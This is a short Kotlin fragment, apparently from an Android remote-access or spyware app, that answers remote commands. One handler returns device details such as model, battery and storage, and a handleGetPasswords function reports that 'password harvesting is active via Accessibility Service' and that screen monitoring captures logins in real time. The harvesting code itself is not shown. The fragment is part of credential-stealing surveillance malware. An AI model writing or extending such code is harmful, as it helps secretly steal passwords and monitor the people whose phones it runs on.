        return success(command.commandId, mapOf(
            "battery" to "$level%",
            "model" to Build.MODEL,
            "android" to Build.VERSION.RELEASE,
            "cpu" to Build.HARDWARE,
            "freeSpace" to (storage.freeSpace / (1024 * 1024)),
            "totalSpace" to (storage.totalSpace / (1024 * 1024))
        ))
    }

    private fun handleGetPasswords(command: DeviceCommand): CommandResult {
        return success(command.commandId, mapOf(
            "status" to "sniffing_active",
            "info" to "Password harvesting is active via Accessibility Service. Screen monitoring captures logins in real-time."
        ))
    }

    private fun success(commandId: String, data: Map<String, Any?>, mediaId: String? = null): CommandResult {
        return CommandResult(commandId = commandId, status = "success", data = data, mediaId = mediaId)
    }

    private fun error(commandId: String, code: String, message: String): CommandResult {
        return CommandResult(commandId = commandId, status = "error", data = emptyMap(), errorCode = code, errorMessage = message)
    }
}
